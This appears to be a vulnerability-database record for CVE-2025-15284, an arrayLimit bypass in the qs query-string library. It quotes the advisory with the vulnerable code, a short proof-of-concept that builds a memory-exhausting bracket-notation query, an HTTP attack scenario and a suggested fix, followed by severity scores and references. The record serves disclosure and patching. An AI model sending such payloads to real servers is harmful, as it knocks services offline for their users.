vulnerability_id: VCID-7x2s-s291-67g4
aliases:
  - CVE-2025-15284
  - GHSA-6rw7-vpxm-498p
summary: "qs's arrayLimit bypass in its bracket notation allows DoS via memory exhaustion\n\
  ### Summary\n\nThe `arrayLimit` option in qs does not enforce limits for bracket notation\
  \ (`a[]=1&a[]=2`), allowing attackers to cause denial-of-service via memory exhaustion. Applications\
  \ using `arrayLimit` for DoS protection are vulnerable.\n\n### Details\n\nThe `arrayLimit`\
  \ option only checks limits for indexed notation (`a[0]=1&a[1]=2`) but completely bypasses\
  \ it for bracket notation (`a[]=1&a[]=2`).\n\n**Vulnerable code** (`lib/parse.js:159-162`):\n\
  ```javascript\nif (root === '[]' && options.parseArrays) {\n    obj = utils.combine([], leaf);\
  \  // No arrayLimit check\n}\n```\n\n**Working code** (`lib/parse.js:175`):\n```javascript\n\
  else if (index <= options.arrayLimit) {  // Limit checked here\n    obj = [];\n    obj[index]\
  \ = leaf;\n}\n```\n\nThe bracket notation handler at line 159 uses `utils.combine([], leaf)`\
  \ without validating against `options.arrayLimit`, while indexed notation at line 175 checks\
  \ `index <= options.arrayLimit` before creating arrays.\n\n### PoC\n\n**Test 1 - Basic bypass:**\n\
  ```bash\nnpm install qs\n```\n\n```javascript\nconst qs = require('qs');\nconst result = qs.parse('a[]=1&a[]=2&a[]=3&a[]=4&a[]=5&a[]=6',\
  \ { arrayLimit: 5 });\nconsole.log(result.a.length);  // Output: 6 (should be max 5)\n```\n\
  \n**Test 2 - DoS demonstration:**\n```javascript\nconst qs = require('qs');\nconst attack\
  \ = 'a[]=' + Array(10000).fill('x').join('&a[]=');\nconst result = qs.parse(attack, { arrayLimit:\
  \ 100 });\nconsole.log(result.a.length);  // Output: 10000 (should be max 100)\n```\n\n**Configuration:**\n\
  - `arrayLimit: 5` (test 1) or `arrayLimit: 100` (test 2)\n- Use bracket notation: `a[]=value`\
  \ (not indexed `a[0]=value`)\n\n### Impact\n\nDenial of Service via memory exhaustion. Affects\
  \ applications using `qs.parse()` with user-controlled input and `arrayLimit` for protection.\n\
  \n**Attack scenario:**\n1. Attacker sends HTTP request: `GET /api/search?filters[]=x&filters[]=x&...&filters[]=x`\
  \ (100,000+ times)\n2. Application parses with `qs.parse(query, { arrayLimit: 100 })`\n3.\
  \ qs ignores limit, parses all 100,000 elements into array\n4. Server memory exhausted â†’ application\
  \ crashes or becomes unresponsive\n5. Service unavailable for all users\n\n**Real-world impact:**\n\
  - Single malicious request can crash server\n- No authentication required\n- Easy to automate\
  \ and scale\n- Affects any endpoint parsing query strings with bracket notation\n\n### Suggested\
  \ Fix\n\nAdd `arrayLimit` validation to the bracket notation handler. The code already calculates\
  \ `currentArrayLength` at line 147-151, but it's not used in the bracket notation handler\
  \ at line 159.\n\n**Current code** (`lib/parse.js:159-162`):\n```javascript\nif (root ===\
  \ '[]' && options.parseArrays) {\n    obj = options.allowEmptyArrays && (leaf === '' || (options.strictNullHandling\
  \ && leaf === null))\n        ? []\n        : utils.combine([], leaf);  // No arrayLimit check\n\
  }\n```\n\n**Fixed code**:\n```javascript\nif (root === '[]' && options.parseArrays) {\n  \
  \  // Use currentArrayLength already calculated at line 147-151\n    if (options.throwOnLimitExceeded\
  \ && currentArrayLength >= options.arrayLimit) {\n        throw new RangeError('Array limit\
  \ exceeded. Only ' + options.arrayLimit + ' element' + (options.arrayLimit === 1 ? '' : 's')\
  \ + ' allowed in an array.');\n    }\n    \n    // If limit exceeded and not throwing, convert\
  \ to object (consistent with indexed notation behavior)\n    if (currentArrayLength >= options.arrayLimit)\
  \ {\n        obj = options.plainObjects ? { __proto__: null } : {};\n        obj[currentArrayLength]\
  \ = leaf;\n    } else {\n        obj = options.allowEmptyArrays && (leaf === '' || (options.strictNullHandling\
  \ && leaf === null))\n            ? []\n            : utils.combine([], leaf);\n    }\n}\n\
  ```\n\nThis makes bracket notation behaviour consistent with indexed notation, enforcing `arrayLimit`\
  \ and converting to object when limit is exceeded (per README documentation)."
severities:
  - score: '7.5'
    scoring_system: cvssv3
    scoring_elements: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H
    published_at: None
    url: https://access.redhat.com/hydra/rest/securitydata/cve/CVE-2025-15284.json
  - score: '0.00152'
    scoring_system: epss
    scoring_elements: '0.36378'
    published_at: '2026-01-08 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2025-15284
  - score: '0.00152'
    scoring_system: epss
    scoring_elements: '0.36349'
    published_at: '2026-01-11 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2025-15284
  - score: HIGH
    scoring_system: cvssv3.1_qr
    scoring_elements:
    published_at: None
    url: https://github.com/advisories/GHSA-6rw7-vpxm-498p
  - score: '7.5'
    scoring_system: cvssv3.1
    scoring_elements: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H
    published_at: None
    url: https://github.com/ljharb/qs
  - score: HIGH
    scoring_system: generic_textual
    scoring_elements:
    published_at: None
    url: https://github.com/ljharb/qs
  - score: '7.5'
    scoring_system: cvssv3.1
    scoring_elements: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H
    published_at: None
    url: https://github.com/ljharb/qs/commit/3086902ecf7f088d0d1803887643ac6c03d415b9
  - score: '8.7'
    scoring_system: cvssv4
    scoring_elements: CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:N
    published_at: None
    url: https://github.com/ljharb/qs/commit/3086902ecf7f088d0d1803887643ac6c03d415b9
  - score: HIGH
    scoring_system: generic_textual
    scoring_elements:
    published_at: None
    url: https://github.com/ljharb/qs/commit/3086902ecf7f088d0d1803887643ac6c03d415b9
  - score: Track
    scoring_system: ssvc
    scoring_elements: SSVCv2/E:N/A:Y/T:P/P:M/B:A/M:M/D:T/2025-12-30T14:55:26Z/
    published_at: None
    url: https://github.com/ljharb/qs/commit/3086902ecf7f088d0d1803887643ac6c03d415b9
  - score: '7.5'
    scoring_system: cvssv3.1
    scoring_elements: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H
    published_at: None
    url: https://github.com/ljharb/qs/security/advisories/GHSA-6rw7-vpxm-498p
  - score: HIGH
    scoring_system: cvssv3.1_qr
    scoring_elements:
    published_at: None
    url: https://github.com/ljharb/qs/security/advisories/GHSA-6rw7-vpxm-498p
  - score: '8.7'
    scoring_system: cvssv4
    scoring_elements: CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:N
    published_at: None
    url: https://github.com/ljharb/qs/security/advisories/GHSA-6rw7-vpxm-498p
  - score: HIGH
    scoring_system: generic_textual
    scoring_elements:
    published_at: None
    url: https://github.com/ljharb/qs/security/advisories/GHSA-6rw7-vpxm-498p
  - score: Track
    scoring_system: ssvc
    scoring_elements: SSVCv2/E:N/A:Y/T:P/P:M/B:A/M:M/D:T/2025-12-30T14:55:26Z/
    published_at: None
    url: https://github.com/ljharb/qs/security/advisories/GHSA-6rw7-vpxm-498p
  - score: '7.5'
    scoring_system: cvssv3.1
    scoring_elements: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H
    published_at: None
    url: https://nvd.nist.gov/vuln/detail/CVE-2025-15284
  - score: HIGH
    scoring_system: generic_textual
    scoring_elements:
    published_at: None
    url: https://nvd.nist.gov/vuln/detail/CVE-2025-15284
weaknesses:
  - CWE-770
  - CWE-20
references:
  - url: https://access.redhat.com/hydra/rest/securitydata/cve/CVE-2025-15284.json
    reference_type:
    reference_id:
  - url: https://api.first.org/data/v1/epss?cve=CVE-2025-15284
    reference_type:
    reference_id:
  - url: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2025-15284
    reference_type:
    reference_id:
  - url: https://github.com/ljharb/qs
    reference_type:
    reference_id:
  - url: https://github.com/ljharb/qs/commit/3086902ecf7f088d0d1803887643ac6c03d415b9
    reference_type:
    reference_id:
  - url: https://github.com/ljharb/qs/security/advisories/GHSA-6rw7-vpxm-498p
    reference_type:
    reference_id:
  - url: https://nvd.nist.gov/vuln/detail/CVE-2025-15284
    reference_type:
    reference_id:
  - url: https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=1124315
    reference_type:
    reference_id: 1124315
  - url: https://bugzilla.redhat.com/show_bug.cgi?id=2425946
    reference_type:
    reference_id: 2425946
  - url: https://github.com/advisories/GHSA-6rw7-vpxm-498p
    reference_type:
    reference_id: GHSA-6rw7-vpxm-498p
  - url: https://access.redhat.com/errata/RHSA-2026:0261
    reference_type:
    reference_id: RHSA-2026:0261
  - url: https://access.redhat.com/errata/RHSA-2026:0414
    reference_type:
    reference_id: RHSA-2026:0414
